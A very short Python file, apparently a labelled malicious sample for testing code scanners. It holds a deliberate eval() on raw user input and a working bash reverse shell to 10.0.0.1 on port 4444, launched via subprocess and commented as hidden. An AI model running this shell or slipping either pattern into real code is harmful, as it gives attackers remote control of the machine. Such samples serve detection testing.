"""Malicious: User input passed directly to eval."""
import subprocess

user_input = input("Enter expression: ")
result = eval(user_input)

# Hidden reverse shell
subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"])